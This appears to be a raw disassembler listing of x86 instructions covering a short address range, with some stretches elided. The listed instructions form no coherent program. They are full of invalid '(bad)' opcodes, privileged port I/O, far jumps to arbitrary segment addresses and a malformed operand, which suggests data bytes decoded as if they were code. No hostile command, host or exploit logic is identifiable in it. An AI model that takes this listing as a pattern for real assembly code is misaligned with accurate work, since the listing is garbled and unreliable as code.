  428267:	out    0x8e,al
  428269:	cmp    bl,bl
  42826b:	mov    ebx,0x686c9243
  428270:	out    dx,al
  428271:	ror    DWORD PTR [edi],1
  428273:	mov    bh,0x56
  428275:	dec    eax
  428276:	lds    ebx,FWORD PTR gs:[edi+0xc860967]
  42827d:	scas   al,BYTE PTR es:[edi]
  42827e:	out    dx,al
  42827f:	add    DWORD PTR [edx],ebp
  428281:	dec    ecx
  428282:	je     0x428213
  428284:	retf   
  428285:	sbb    DWORD PTR [esi+0x1d484cd2],0x5d
  42828c:	mov    edx,0xda3083
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	scas   eax,DWORD PTR es:[edi]
  428301:	mov    ds:0xad3c650b,al
  428306:	add    DWORD PTR [eax],eax
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	pop    edi
  42830d:	lea    ebp,[ebp+0xe]
  428310:	sub    eax,0x9622b07a
  428315:	sub    dh,0x3e
  428318:	pop    es
  428319:	and    BYTE PTR [ecx],0xf6
  42831c:	out    dx,al
  42831d:	mov    dl,0x78
  42831f:	loope  0x42830e
  428321:	dec    esi
  428322:	hlt    
  428323:	mov    eax,ds:0x81640f1b
  428328:	xchg   esp,eax
  428329:	in     al,0xb4
  42832b:	cmp    ah,BYTE PTR [edi-0x8e73a8a]
  428331:	mov    eax,ds:0x8a976051
  428336:	loope  0x4282c7
  428338:	std    
  428339:	(bad)  
  42833a:	call   0x443848e3
  42833f:	pusha  
  428340:	(bad)  
  428341:	push   ebp
  428342:	cmc    
  428343:	test   al,0x96
  428345:	or     ebx,DWORD PTR [edi+eax*4+0x7b]
  428349:	jmp    0x2248:0x6369fb80
  428350:	or     ebp,DWORD PTR [edx-0x7c]
  428353:	and    eax,0xe276906c
  428358:	push   ebx
  428359:	jnp    0x4283b0
  42835b:	aad    0xf1
  42835d:	jne    0x42832a
  42835f:	aam    0xa4
  428361:	or     al,0x73
  428363:	scas   eax,DWORD PTR es:[edi]
  428364:	jmp    0x8fa9:0x3d9552d7
  42836b:	repnz push esp
  42836d:	ret    
  42836e:	mov    WORD PTR [ebp+0x2a],es
  428371:	outs   dx,DWORD PTR ds:[esi]
  428372:	or     al,0x32
  428374:	xor    al,0xdd
  428376:	cmp    BYTE PTR [edi],al
  428378:	cdq    
  428379:	int3   
  42837a:	pop    ebp
  42837b:	and    cl,bl
  42837d:	sub    al,BYTE PTR [ebx-0x45]
  428380:	jnp    0x428376
  428382:	ins    BYTE PTR es:[edi],dx
  428383:	ret    0x3b3b
  428386:	xor    DWORD PTR [esi+0x3e582c5a],esp
  42838c:	xchg   cl,ch
  42838e:	jbe    0x4283e0
  428390:	mov    dh,0x59
  428392:	js     0x4283c6
  428394:	fist   WORD PTR [ebx+0x9]
  428397:	cmp    esp,DWORD PTR [edi-0x5bd1d1d7]
  42839d:	xchg   edi,eax
  42839e:	mov    ebp,0x8b87a37b
  4283a3:	inc    edx
  4283a4:	(bad)
  4283a7:	das    
  4283a8:	or     al,0xd4
  4283aa:	xchg   DWORD PTR [eax-0x49ee27d],ecx
  4283b0:	cmc    
  4283b1:	ficomp WORD PTR [eax-0x51]
  4283b4:	inc    esi
  4283b5:	pop    edx
  4283b6:	int    0x3d
  4283b8:	sahf   
  4283b9:	das    
  4283ba:	sub    eax,0x1dfea46a
  4283bf:	aam    0xd0
  4283c1:	sub    ah,ch
  4283c3:	out    0xf4,eax
  4283c5:	xor    BYTE PTR [ecx],dl
  4283c7:	xchg   esp,eax
  4283c8:	xchg   bl,ch
  4283ca:	mov    BYTE PTR [edi+0x70],cl
  4283cd:	pop    eax
  4283ce:	mov    al,ds:0x4e808e39
  4283d3:	test   DWORD PTR [eax-0x16],ebx
  4283d6:	push   es
  4283d7:	sbb    al,0x9
  4283d9:	lods   al,BYTE PTR ds:[esi]
  4283da:	mov    edi,DWORD PTR [eax+0x5d0d86b1]
  4283e0:	outs   dx,DWORD PTR ds:[esi]
  4283e1:	cwde   
  4283e2:	(bad)  
  4283e3:	lods   al,BYTE PTR ds:[esi]
  4283e4:	not    ah
  4283e6:	mov    al,0xf9
  4283e8:	in     al,0x2d
  4283ea:	leave  
  4283eb:	ret    0xea0d
  4283ee:	add    al,0x1e
  4283f0:	pop    es
  4283f1:	dec    ecx
  4283f2:	xor    BYTE PTR ds:0xaea14dcd,cl
  4283f8:	push   0xffffffc4
  4283fa:	jmp    0x42846c
  4283fc:	inc    edi
  4283fd:	iretw  
  4283ff:	aas    
  428400:	mov    ds:0x7b1d1b93,eax
  428405:	div    DWORD PTR [esi]
  428407:	sbb    eax,0x5e031288
  42840c:	clc    
  42840d:	outs   dx,DWORD PTR ds:[esi]
  42840e:	mov    ah,0x44
	...
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x7aabfb32
  428481:	add    eax,DWORD PTR [esp+esi*2+0x40]
  428485:	scas   al,BYTE PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	sbb    al,0xa5
  42848e:	(bad)  
  42848f:	pop    edi
  428490:	add    al,0xcf
  428492:	mov    ds:0xf34b12e8,eax
  428497:	mov    al,0xf3
  428499:	sbb    DWORD PTR [ebp-0x48f3f4d7],eax
  42849f:	popa   
  4284a0:	and    dh,0x3a
  4284a3:	cmp    ch,BYTE PTR [edi+0xf8ed8e9]
  4284a9:	dec    esp
  4284aa:	jmp    0x42850f
  4284ac:	fcmovnb st,st(2)
  4284ae:	arpl   WORD PTR [ecx-0x44],sp
  4284b1:	fmul   DWORD PTR [edi+edx*8]
  4284b4:	pusha  
  4284b5:	mov    al,0x2e
  4284b7:	pop    ds
  4284b8:	jg     0x4284b5
  4284ba:	push   0x31
  4284bc:	xor    edx,DWORD PTR [ebx+0x46]
  4284bf:	push   0x2225bf65
  4284c4:	das    
  4284c5:	imul   ebp,DWORD PTR [edi+0x7396d552]
  4284cc:	lock mov ds:0xb09a3897,eax
  4284d2:	sbb    dl,dh
  4284d4:	inc    edi
  4284d5:	ins    BYTE PTR es:[edi],dx
  4284d6:	jecxz  0x428482
  4284d8:	call   0x4cf49bd1
  4284dd:	xchg   DWORD PTR [eax-0x9c677],edi
  4284e3:	inc    ebp
  4284e4:	pop    esp
  4284e5:	ja     0x4284a1
  4284e7:	imul   ecx,DWORD PTR [edi]
  4284ea:	xchg   ebp,eax
  4284eb:	repnz data16 add al,0x21
  4284ef:	add    BYTE PTR [ebp+0x58],cl
  4284f2:	add    bh,BYTE PTR [ebx+0x667160d3]
  4284f8:	jmp    edi
  4284fa:	aam    0x57
  4284fc:	loope  0x428535
  4284fe:	lock dec edx
  428500:	and    dh,BYTE PTR [esi-0x457c59cf]
  428506:	(bad)  
  428507:	(bad)  
  428508:	sbb    BYTE PTR [ebx],dl
  42850a:	push   0xffffffaa
  42850c:	push   eax
  42850d:	dec    ebp
  42850e:	add    al,0x71
  428510:	jb     0x428541
  428512:	dec    esp
  428513:	stos   DWORD PTR es:[edi],eax
  428514:	add    al,BYTE PTR [esi+0x10f7227f]
  42851a:	shr    BYTE PTR [ebx-0x39996879],cl
  428520:	jbe    0x428532
  428522:	jo     0x4284c3
  428524:	out    dx,al
  428525:	dec    edx
  428526:	jge    0x428583
  428528:	ficom  DWORD PTR ds:0xe3e92a43
  42852e:	lds    edx,FWORD PTR [edx+0x4e1bf86f]
  428534:	(bad)  
  428535:	das    
  428536:	mov    ecx,0xaef099a6
  42853b:	sar    BYTE PTR [edx-0x5a6f2279],cl
  428541:	push   eax
  428542:	adc    al,0xb7
  428544:	(bad)  
  428545:	mov    esi,0xa7a2223c
  42854a:	jno    0x4285a1
  42854c:	add    DWORD PTR [ecx+edx*2],0xee95403b
  428553:	shr    BYTE PTR [ebx+0x52],0xa8
  428557:	dec    ecx
  428558:	arpl   WORD PTR [edi],di
  42855a:	cmp    eax,DWORD PTR [ecx-0x40f35d3b]
  428560:	mov    bl,0x91
  428562:	pop    ds
  428563:	ja     0x42857b
  428565:	adc    al,0x76
  428567:	(bad)  
  428568:	int3   
  428569:	loope  0x428550
  42856b:	lods   eax,DWORD PTR ds:[esi]
  42856c:	mov    eax,ds:0xa286bc3c
  428571:	pop    ebx
  428572:	jle    0x4285e3
  428574:	leave  
  428575:	std    
  428576:	cmp    al,0x1
  428578:	xchg   edi,eax
  428579:	mov    edi,0xb6096690
  42857e:	xor    BYTE PTR fs:[ecx],ch
  428581:	hlt    
  428582:	jbe    0x428547
  428584:	cmp    ah,BYTE PTR [edx+0x23]
  428587:	xchg   esi,eax
  428588:	mov    ah,0x79
  42858a:	ins    DWORD PTR es:[edi],dx
  42858b:	dec    esp
  42858c:	sbb    BYTE PTR [edx],dh
  42858e:	sbb    BYTE PTR [edx],al
	...
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x25bea3f6
  428602:	xor    dl,BYTE PTR [ebp+0x1af44]
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	inc    ebx
  42860d:	test   DWORD PTR [ebx-0x38e8393e],0xc1d7be72
  428617:	ret    
  428618:	push   edi
  428619:	sbb    eax,edx
  42861b:	add    eax,0x8b6ef6dc
  428620:	loop   0x4285c1
  428622:	(bad)  
  428623:	cli    
  428624:	sar    DWORD PTR [edi-0x7],0x64
  428628:	out    dx,al
  428629:	jp     0x4286a7
  42862b:	fcomp  QWORD PTR [edi]
  42862d:	fcomp  QWORD PTR [ecx+esi*2+0x61]
  428631:	js     0x428698
  428633:	sub    ebp,0x37
  428636:	je     0x42860a
  428638:	sbb    bh,bh
  42863a:	lea    edx,[ebp-0x13b33727]
  428640:	stos   BYTE PTR es:[edi],al
  428641:	rcl    BYTE PTR [ebp-0x5e9e2ec7],0x29
  428648:	cmp    BYTE PTR [esi],ch
  42864a:	fimul  DWORD PTR [eax+0x18179f5d]
  428650:	aad    0x17
  428652:	call   0x6077f8a6
  428657:	sbb    ecx,DWORD PTR [ecx-0x6c016ab8]
  42865d:	inc    edx
  42865e:	fiadd  DWORD PTR [eax-0x75]
  428661:	inc    esi
  428662:	add    eax,0x3585708c
  428667:	das    
  428668:	push   edi
  428669:	mov    al,0xda
  42866b:	rcr    ah,1
  42866d:	push   ebp
  42866e:	pop    ds
  42866f:	cld    
  428670:	or     dl,al
  428672:	in     al,dx
  428673:	add    DWORD PTR [edx-0xa],edx
  428676:	leave  
  428677:	mov    cl,bh
  428679:	fs das 
  42867b:	and    edi,DWORD PTR [edx+0x5b]
  42867e:	inc    esp
  42867f:	xchg   edx,eax
  428680:	ins    DWORD PTR es:[edi],dx
  428681:	mov    edi,ebx
  428683:	bts    DWORD PTR [bp+si-0x4c],ecx
  428688:	retf   
  428689:	jo     0x42865d
  42868b:	jo     0x4286e6
  42868d:	aam    0x5d
  42868f:	mov    eax,ds:0xed607b0d
  428694:	xchg   edi,eax
  428695:	pcmpgtw mm3,QWORD PTR [ebx-0x4f]
  428699:	sub    eax,esp
  42869b:	add    eax,0x5ca0243c
  4286a0:	mov    DWORD PTR [ebp+0x4d58b581],ebp
  4286a6:	xchg   edi,eax
  4286a7:	pop    ecx
  4286a8:	leave  
  4286a9:	js     0x4286e8
  4286ab:	dec    esp
  4286ac:	div    BYTE PTR [ebp+0x74f2c092]
  4286b2:	cli    
  4286b3:	call   0x68e3:0x76c4a81b
  4286ba:	jb     0x428684
  4286bc:	mov    eax,ds:0x471a0f47
  4286c1:	jo     0x42871b
  4286c3:	pop    edx
  4286c4:	inc    ecx
  4286c5:	outs   dx,DWORD PTR ds:[esi]
  4286c6:	xlat   BYTE PTR ds:[ebx]
  4286c7:	stc    
  4286c8:	or     dl,BYTE PTR [eax+0x5d]
  4286cb:	jns    0x428740
  4286cd:	pop    eax
  4286ce:	mov    edx,0xe52df30e
  4286d3:	xchg   edi,eax
  4286d4:	imul   edi,DWORD PTR [eax],0x7b
  4286d7:	pop    esp
  4286d8:	mov    dl,0x15
  4286da:	cmp    BYTE PTR [esi],dl
  4286dc:	out    dx,eax
  4286dd:	mov    ch,0xb6
  4286df:	int3   
  4286e0:	dec    edx
  4286e2:	or     esp,DWORD PTR [ecx]
  4286e4:	inc    esp
  4286e5:	jl     0x4286d0
  4286e7:	inc    esi
  4286e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286e9:	int    0xc
  4286eb:	int3   
  4286ec:	nop
  4286ed:	xchg   esp,eax
  4286ee:	gs xchg edi,eax
  4286f0:	fmulp  st(7),st
  4286f2:	shl    BYTE PTR [ecx-0x1dbd7525],cl
  4286f8:	mov    eax,ds:0x9df21aed
  4286fd:	xchg   ebx,eax
  4286fe:	fidiv  WORD PTR [edx*2+0x88bb28a]
  428705:	sub    dl,BYTE PTR [esi+0x4e]
  428708:	xchg   ebx,eax
  428709:	(bad)
  42870c:	dec    esp
  42870d:	mov    dl,0x1b
  42870f:	mov    eax,ds:0x0
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x12cd7696
  428783:	mov    BYTE PTR [eax-0x50],cl
  428786:	add    DWORD PTR [eax],eax
  428788:	add    al,0x1
  42878a:	add    BYTE PTR [eax],al
  42878c:	pop    edi
  42878d:	push   ss
  42878e:	(bad)  
  42878f:	loopne 0x42878c
  428791:	lahf   
  428792:	and    DWORD PTR [eax],ebx
  428794:	push   ds
  428795:	jo     0x42871a
  428797:	rcr    BYTE PTR [edi],cl
  428799:	or     al,0x53
  42879b:	sbb    DWORD PTR [eax],eax
  42879d:	xor    DWORD PTR [edi],esp
  42879f:	bound  edi,QWORD PTR [esi-0x20ec61f4]
  4287a5:	(bad)  
  4287a6:	aas    
  4287a7:	sti    
  4287a8:	pop    ds
  4287a9:	pusha  
  4287aa:	mov    dh,0xc4
  4287ac:	push   0x73d82ecf
  4287b1:	inc    ebx
  4287b2:	sar    BYTE PTR [ebx-0x3e58fbde],cl
  4287b8:	dec    esi
  4287b9:	pop    ebp
  4287ba:	loop   0x428787
  4287bc:	pop    ds
  4287bd:	scas   eax,DWORD PTR es:[edi]
  4287be:	add    ah,dh
  4287c0:	jns    0x4287d4
  4287c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287c3:	inc    ecx
  4287c4:	mov    eax,ds:0x7d1d8dbb
  4287c9:	ror    esp,cl
  4287cb:	aad    0x3c
  4287cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287ce:	dec    esp
  4287cf:	mov    eax,0xf2d4f001
  4287d4:	sti    
  4287d5:	repnz mov eax,0xc9166946
  4287db:	sti    
  4287dc:	clc    
  4287dd:	test   al,0x27
  4287df:	call   0x5ce653c9
  4287e4:	jnp    0x42879f
  4287e6:	push   edx
  4287e7:	int3   
  4287e8:	jmp    0x9628:0x958c7cfa
  4287ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287f0:	ja     0x4287f4
  4287f2:	fistp  WORD PTR [ebp-0x781c5c26]
  4287f8:	ret    
  4287f9:	jb     0x42880c
  4287fb:	fcom   DWORD PTR [edx-0x3851a1d3]
  428801:	fsubr  DWORD PTR [eax]
  428803:	sub    al,0xb
  428805:	adc    bl,BYTE PTR [edi-0x3b6f48c8]
  42880b:	xchg   esp,eax
  42880c:	mov    ch,0xd1
  42880e:	xor    BYTE PTR [ebx],dh
  428810:	sub    eax,0x1cac1af
  428815:	sub    eax,0xca0b229d
  42881a:	mov    DWORD PTR [edx],edi
  42881c:	test   eax,0x13307131
  428821:	sbb    DWORD PTR [eax-0x3dbacb43],ebp
  428827:	mov    ds:0x5613f57e,al
  42882c:	and    DWORD PTR [ecx-0x7a56ebdb],eax
  428832:	cwde   
  428833:	cmp    edi,DWORD PTR [ecx-0x1b]
  428836:	mov    al,ds:0xd7256e58
  42883b:	mov    dh,0xef
  42883d:	sub    BYTE PTR [esi-0x17],dl
  428840:	jp     0x4288b3
  428842:	cld    
  428843:	cmp    al,0xfc
  428845:	and    al,0x65
  428847:	fcomp  DWORD PTR [edx+0x2552c383]
  42884d:	call   0xab2b9089
  428852:	add    al,ch
  428854:	ficom  WORD PTR [esi*1+0x6fde9f4c]
  42885b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42885c:	loope  0x428842
  42885e:	jbe    0x4288bb
  428860:	pop    ss
  428861:	mov    cl,0xbc
  428863:	sbb    al,BYTE PTR [ebp-0x21d57be7]
  428869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42886a:	sbb    ecx,0xffffffef
  42886d:	call   0xc5c46800
  428872:	mov    edx,0xe5222669
  428877:	pop    ebx
  428878:	sub    BYTE PTR [ebx-0x763ad4ab],dh
  42887e:	xchg   esp,eax
  42887f:	mov    bl,0xa5
  428881:	push   ebx
  428882:	out    0x91,al
  428884:	les    ebp,FWORD PTR [ebx]
  428886:	and    al,0xbe
  428888:	mov    dh,0x38
  42888a:	stc    
  42888b:	push   ss
  42888c:	adc    ch,ah
  42888e:	xchg   esi,eax
  42888f:	and    al,0x0
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x3ea39d0f],bx
  428902:	push   ebx
  428903:	jns    0x428951
  428905:	mov    cl,0x1
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	mov    ?,WORD PTR [ecx]
  42890e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42890f:	adc    ebp,DWORD PTR [eax+0x53]
  428912:	jmp    DWORD PTR [edx+edi*8-0x1ddd8638]
  428919:	in     al,dx
  42891a:	sbb    bh,BYTE PTR [ebx]
  42891c:	push   ss
  42891d:	jo     0x42892f
  42891f:	mov    WORD PTR [eax+0x7d],fs
  428922:	or     ebx,DWORD PTR [ecx+0x15]
  428925:	sub    al,0x4b
  428927:	cmp    BYTE PTR [edx],cl
  428929:	sbb    edi,DWORD PTR [edx]
  42892b:	and    ebp,DWORD PTR [edi-0x5]
  42892e:	call   0x66fd:0xc4db22a
  428935:	sbb    esp,DWORD PTR [edx-0x59]
  428938:	jns    0x4288d9
  42893a:	xchg   edi,eax
  42893b:	arpl   WORD PTR [edi-0x37],sp
  42893e:	(bad)  [eax-0x6a]
  428941:	loop   0x42890b
  428943:	mov    eax,0xfd007c93
  428948:	cmp    ebp,DWORD PTR [edx+0x706ddbd3]
  42894e:	xchg   ecx,eax
  42894f:	pushf  
  428950:	test   eax,0x716e74d0
  428955:	retf   
  428956:	xor    DWORD PTR [ebp-0x59],0xffffffc4
  42895a:	je     0x428948
  42895c:	push   esi
  42895d:	mov    bh,0x2
  42895f:	out    0xa8,al
  428961:	lea    ecx,[edx]
  428963:	popf   
  428964:	leave  
  428965:	sub    eax,0x3e883ae
  42896a:	xor    DWORD PTR [ecx],esi
  42896c:	jno    0x4289d9
  42896e:	in     eax,dx
  42896f:	(bad)  
  428970:	into   
  428971:	mov    ds:0x74c5d52d,al
  428976:	pop    ebx
  428977:	mov    dl,0x53
  428979:	int3   
  42897a:	and    bl,BYTE PTR ds:0x24b73d23
  428980:	xor    BYTE PTR [edx],bh
  428982:	std    
  428983:	pop    eax
  428984:	das    
  428985:	mov    cl,BYTE PTR [esi]
  428987:	ret    
  428988:	(bad)  
  428989:	mov    al,0x46
  42898b:	jle    0x4289ee
  42898d:	leave  
  42898e:	fs add al,0xf9
  428991:	lock and al,bl
  428994:	loopne 0x428986
  428996:	test   eax,0xb5a93c
  42899b:	scas   eax,DWORD PTR es:[edi]
  42899c:	loope  0x4289cd
  42899e:	pop    ebx
  42899f:	cmp    ch,BYTE PTR [ebx+0x33571c2c]
  4289a5:	js     0x4289e2
  4289a7:	adc    ch,al
  4289a9:	pop    ss
  4289aa:	add    al,0xa8
  4289ac:	push   ebx
  4289ad:	xor    eax,0xdc693b9a
  4289b2:	int    0x9b
  4289b4:	inc    eax
  4289b5:	push   cs
  4289b6:	aam    0xbc
  4289b8:	cmp    DWORD PTR [ebx-0x7c],ecx
  4289bb:	sahf   
  4289bc:	jbe    0x428a2f
  4289be:	push   esi
  4289bf:	dec    ebx
  4289c0:	sub    DWORD PTR [edx-0x6c],ecx
  4289c3:	call   FWORD PTR [edx+0x46]
  4289c6:	shr    DWORD PTR [esi-0x1b951767],0x1a
  4289cd:	fs out 0x3d,eax
  4289d0:	xchg   edi,eax
  4289d1:	xor    cl,BYTE PTR [edi-0x19df4f02]
  4289d7:	gs cmp al,al
  4289da:	jb     0x4289ff
  4289dc:	or     bh,BYTE PTR [edx-0x30]
  4289df:	ret    
  4289e0:	push   eax
  4289e1:	(bad)  
  4289e2:	out    dx,eax
  4289e3:	rcr    BYTE PTR [ebx],cl
  4289e5:	das    
  4289e6:	mov    bl,0x8b
  4289e8:	mov    ebx,0xd18aacc
  4289ed:	xchg   BYTE PTR [ebx+0x3a],bh
  4289f0:	rcl    cl,1
  4289f2:	in     al,dx
  4289f3:	xor    edi,DWORD PTR [ebx+0x19]
  4289f6:	dec    edx
  4289f7:	popa   
  4289f8:	stc    
  4289f9:	or     BYTE PTR [ebx+0x4f126ddf],al
  4289ff:	jns    0x428a70
  428a01:	jmp    0xc42a8a5c
  428a06:	int3   
  428a07:	dec    edi
  428a08:	in     al,dx
  428a09:	into   
  428a0a:	cmp    eax,0x3622c8bb
  428a0f:	js     0x428a11
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x518c76ed]
  428a83:	push   ds
  428a84:	push   eax
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	cli    
  428a8d:	xchg   esi,eax
  428a8e:	and    BYTE PTR [bx+si-0x67],al
  428a92:	inc    esi
  428a93:	in     eax,dx
  428a94:	xchg   ebx,eax
  428a95:	inc    ebp
  428a96:	test   eax,0x48950917
  428a9b:	ja     0x428af6
  428a9d:	aam    0x13
  428a9f:	xchg   ecx,eax
  428aa0:	and    eax,0xc3def2d2
  428aa5:	mov    ah,0xa6
  428aa7:	mov    ebp,0x5086943a
  428aac:	sub    al,0x7b
  428aae:	mov    ebp,0xf2a802d2
  428ab3:	sbb    DWORD PTR [esi+edx*4],esp
  428ab6:	inc    eax
  428ab7:	int3   
  428ab8:	div    BYTE PTR [ebp+0x22]
  428abb:	cs jl  0x428b2d
  428abe:	(bad)  
  428abf:	in     al,dx
  428ac0:	sbb    dh,ah
  428ac2:	xchg   esp,eax
  428ac3:	ins    DWORD PTR es:[edi],dx
  428ac4:	mov    dh,0x35
  428ac6:	nop
  428ac7:	push   es
  428ac8:	call   0x89361c65
  428acd:	mov    eax,0xb8fd2113
  428ad2:	sti    
  428ad3:	sub    eax,0xf9a457a5
  428ad8:	inc    ebp
  428ad9:	mov    DWORD PTR [ebx+0x44d2b195],0x610526cf
  428ae3:	mov    ah,0x37
  428ae5:	dec    edx
  428ae6:	pop    ebx
  428ae7:	data16 xor ch,BYTE PTR [esi-0x3e091308]
  428aee:	or     ebp,0x76
  428af1:	cmp    edi,DWORD PTR [edx+ebx*2+0x8]
  428af5:	repz imul ebp,DWORD PTR [ebx],0xb26e0e2f
  428afc:	pop    esi
  428afd:	and    al,0xf6
  428aff:	add    al,0x8c
  428b01:	fcomp  QWORD PTR [ecx+esi*2+0x60]
  428b05:	jg     0x428b51
  428b07:	shr    BYTE PTR [ebx-0x5d4fbf62],cl
  428b0d:	outs   dx,BYTE PTR ds:[esi]
  428b0e:	ins    DWORD PTR es:[edi],dx
  428b0f:	mov    dl,0x2c
  428b11:	push   es
  428b12:	inc    esi
  428b13:	pop    ebp
  428b14:	cmp    DWORD PTR [edi-0x4f2e051a],0xab835679
  428b1e:	nop
  428b1f:	fsub   DWORD PTR [esi+0x5]
  428b22:	or     DWORD PTR [ebx-0x12],0x3b
  428b26:	dec    ebx
  428b27:	fist   WORD PTR [edi+0x2537567]
  428b2d:	mov    ecx,0x2781256a
  428b32:	les    ebx,FWORD PTR [edx+0x64]
  428b35:	jge    0x428b47
  428b37:	call   0xd6724c07
  428b3c:	xor    DWORD PTR [edi+0x2d],ecx
  428b3f:	dec    DWORD PTR [ecx-0x4e]
  428b42:	retf   
  428b43:	inc    ebp
  428b44:	jne    0x428b20
  428b46:	and    esp,ecx
  428b48:	cli    
  428b49:	retf   
  428b4a:	xchg   edx,eax
  428b4b:	aam    0x5
  428b4d:	retf   0xb421
  428b50:	fcomp  DWORD PTR [edi-0x59]
  428b53:	sar    al,cl
  428b55:	mov    al,ds:0x4ac7c605
  428b5a:	dec    edx
  428b5b:	sti    
  428b5c:	push   0xc4b52820
  428b61:	idiv   esp
  428b63:	jmp    0x428bd1
  428b65:	push   ebx
  428b66:	shl    dh,1
  428b68:	xchg   ebp,eax
  428b69:	arpl   WORD PTR [edi+eax*8+0x2d4e1c49],bp
  428b70:	std    
  428b71:	fild   QWORD PTR [ecx-0x63cff4f1]
  428b77:	mov    cl,0xd4
  428b79:	test   BYTE PTR [edx-0x11],dh
  428b7c:	ins    DWORD PTR es:[edi],dx
  428b7d:	retf   
  428b7e:	jns    0x428b24
  428b80:	mov    fs,WORD PTR [ebp+0x77]
  428b83:	mov    edi,0x7e402c27
  428b88:	in     al,dx
  428b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b8a:	jmp    DWORD PTR [edi+0x50]
  428b8d:	mov    ss,WORD PTR [ebx]
  428b8f:	add    BYTE PTR ds:[eax],al
	...
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xc4e8a0ac
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	inc    edi
  428c0d:	call   FWORD PTR [eax+edx*2]
  428c10:	and    esp,DWORD PTR [ebp+0x13]
  428c13:	mov    eax,ds:0x78cbe6b3
  428c18:	mov    bh,0xe3
  428c1a:	scas   eax,DWORD PTR es:[edi]
  428c1b:	dec    eax
  428c1c:	pop    ecx
  428c1d:	add    cl,BYTE PTR [eax*4-0x6a6060aa]
  428c24:	jle    0x428bab
  428c26:	pop    edi
  428c27:	enter  0x7113,0xb5
  428c2b:	icebp  
  428c2c:	xlat   BYTE PTR ds:[ebx]
  428c2d:	and    DWORD PTR [eax-0x65a070e2],esi
  428c33:	outs   dx,DWORD PTR ds:[esi]
  428c34:	xor    al,0xc0
  428c36:	retf   
  428c37:	sub    esi,ebx
  428c39:	push   0x7a
  428c3b:	popa   
  428c3c:	cmp    eax,DWORD PTR [ebp-0x67]
  428c3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c40:	push   0xd72d0baa
  428c45:	shl    edi,cl
  428c47:	shr    DWORD PTR [ebp+0x3bbd0efa],cl
  428c4d:	ret    
  428c4e:	pop    ecx
  428c4f:	jbe    0x428cc3
  428c51:	in     al,0xb
  428c53:	ret    0xd24b
  428c56:	js     0x428c32
  428c58:	gs repnz das 
  428c5b:	and    ch,dl
  428c5d:	cli    
  428c5e:	xchg   bl,dl
  428c60:	ror    ecx,0x35
  428c63:	jge    0x428c86
  428c65:	lock bound ecx,QWORD PTR [edi+0x2516585c]
  428c6c:	push   0x18
  428c6e:	mov    ecx,DWORD PTR [ebx-0x2d5f6ad6]
  428c74:	mov    bh,0x13
  428c76:	rol    ecx,cl
  428c78:	and    al,0xd3
  428c7a:	ficomp DWORD PTR [ebx-0x5e]
  428c7d:	push   esi
  428c7e:	(bad)  
  428c7f:	gs inc ebx
  428c81:	in     al,0x7a
  428c83:	imul   eax,DWORD PTR [esi-0x19],0x55
  428c87:	nop
  428c88:	mov    ah,0xfe
  428c8a:	div    edx
  428c8c:	push   0xfffffffd
  428c8e:	sar    DWORD PTR [edx],1
  428c90:	pop    edi
  428c91:	(bad)  
  428c92:	fdiv   QWORD PTR [eax-0x420eddee]
  428c98:	xchg   esi,eax
  428c99:	mov    dl,BYTE PTR [edi+0x1e8d86e4]
  428c9f:	inc    edx
  428ca0:	cli    
  428ca1:	mov    al,0xe1
  428ca3:	mov    ds:0x76263f58,eax
  428ca8:	inc    ebp
  428ca9:	js     0x428d0f
  428cab:	test   al,0x9c
  428cad:	aad    0xd5
  428caf:	or     eax,0xc2cb664f
  428cb4:	and    bl,ah
  428cb6:	pop    es
  428cb7:	dec    esi
  428cb8:	jl     0x428ca9
  428cba:	fadd   st(4),st
  428cbc:	out    0xb5,al
  428cbe:	lahf   
  428cbf:	pop    ecx
  428cc0:	cdq    
  428cc1:	ror    dh,1
  428cc3:	push   ebx
  428cc4:	lods   al,BYTE PTR ds:[esi]
  428cc5:	nop
  428cc6:	mov    ds:0x25be0be6,al
  428ccb:	cmp    eax,0xa7176614
  428cd0:	inc    ecx
  428cd1:	test   ebx,ebx
  428cd3:	pop    esp
  428cd4:	cwde   
